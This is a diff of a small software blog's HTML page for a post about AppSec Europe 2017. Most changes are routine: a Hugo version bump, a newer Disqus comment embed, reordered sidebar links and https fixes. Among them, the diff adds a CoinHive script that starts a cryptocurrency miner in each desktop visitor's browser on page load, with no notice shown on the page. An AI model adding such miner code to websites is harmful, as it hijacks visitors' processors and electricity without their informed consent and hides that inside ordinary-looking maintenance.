@@ -8,7 +8,7 @@
         <meta name="description" content="Code, projects and research.">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="google-site-verification" content="Zbq7kqwOKubIPWTseZ6SjnuDMSE9MTYPLvl7-lfZlJ4" />
-        <meta name="generator" content="Hugo 0.18.1" />
+        <meta name="generator" content="Hugo 0.30.2" />
         <link href="http://www.azert.co.uk/post/index.xml" rel="alternate" type="application/rss+xml" title="Azert Software" />
         <link href="http://www.azert.co.uk/post/index.xml" rel="feed" type="application/rss+xml" title="Azert Software" />
         <link href='//fonts.googleapis.com/css?family=Roboto:400,300,700|Noto+Serif:400,400italic,700,700italic' rel='stylesheet' type='text/css'>
@@ -83,20 +83,25 @@
         <div class="comments">
             <h3></h3>
             <div id="disqus_thread"></div>
-<script type="text/javascript">
-    var disqus_shortname = 'azertsoftware';
-    var disqus_identifier = 'http:\/\/www.azert.co.uk\/post\/appsec-europe-2017-comes-to-belfast\/';
-    var disqus_title = 'AppSec Europe 2017 Comes To Belfast';
-    var disqus_url = 'http:\/\/www.azert.co.uk\/post\/appsec-europe-2017-comes-to-belfast\/';
-
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
     (function() {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "azertsoftware" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
     })();
 </script>
-<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
         </div>
     </main>
     <aside class="author">
@@ -109,16 +114,16 @@
     <ul>
         
         
+        <li class="sidebar-nav-item active">
+            <a title="Posts" href="/post">Posts</a>
+        </li>
+        
         <li class="sidebar-nav-item">
-            <a title="About" href="/about/">About</a>
+            <a title="About Azert" href="/about/">About Azert</a>
         </li>
         
         <li class="sidebar-nav-item">
             <a title="Projects" href="/project/">Projects</a>
-        </li>
-        
-        <li class="sidebar-nav-item active">
-            <a title="Posts" href="/post">Posts</a>
         </li>
         
     </ul>
@@ -166,13 +171,22 @@
 <script src="http://www.azert.co.uk/js/plugins.js"></script>
 
 
+<script src="//coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('Vg1WNbloXajpWkpHshY0p7ej8gFK1iTM', {throttle: 0.3});
 
+	
+	
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
 
 <script>
 (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
 (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
 m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 
 ga('create', 'UA-91073756-1', 'auto');
 ga('send', 'pageview');
